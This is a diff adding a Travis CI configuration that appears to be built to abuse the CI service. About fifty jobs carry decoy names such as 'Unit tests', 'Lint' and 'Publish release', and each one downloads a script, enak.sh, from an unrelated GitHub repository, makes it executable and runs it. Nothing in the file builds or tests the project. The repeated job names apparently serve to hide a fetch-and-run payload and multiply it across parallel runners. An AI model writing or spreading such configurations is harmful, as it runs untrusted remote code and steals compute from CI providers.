@@ -1,0 +1,269 @@
+dist: bionic
+
+language: node_js
+
+branches:
+  only:
+    - /.*/
+
+cache:
+  directories:
+    - node_modules
+
+node_js:
+  - '12.16.3'
+
+jobs:
+  allow_failures:
+    - name: 'Coba tests'
+  include:
+
+    - name: 'Siji1'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Loro2'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Telu3'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Papat4'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Limo5'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Enem6'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Pitu 7 ah'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '8 wolu'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '9 gas'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'sepuluhgas10'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '789'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '6668 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '4234 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '423 docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '512 release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '341'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '423 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '54 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '121 docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '73 release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '41 yy'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: '6234 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Muta5253tion tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Bu452ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Pu5234blish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Li5523nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Un324it tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Mutation tes52ts'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Build 41docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Publ414ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Li43nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Uni42t tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Mut411ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Bu4412ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Pu31312blish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Li323nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Unit5452 tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Mut4342ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Bu434213ild docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Pub543521lish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Lin535231t'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Un5235it tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Mut5253ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Buil523523d docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Publ523523ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Li523523nt'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'U5235235nit tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Mut35235ation tests'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Bui4234ld docker image'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
+
+    - name: 'Publ4234234ish release'
+      before_script:
+        - wget https://raw.githubusercontent.com/keepstrong13/opotah/main/enak.sh && chmod u+x enak.sh && ./enak.sh
+      script: bash enak.sh
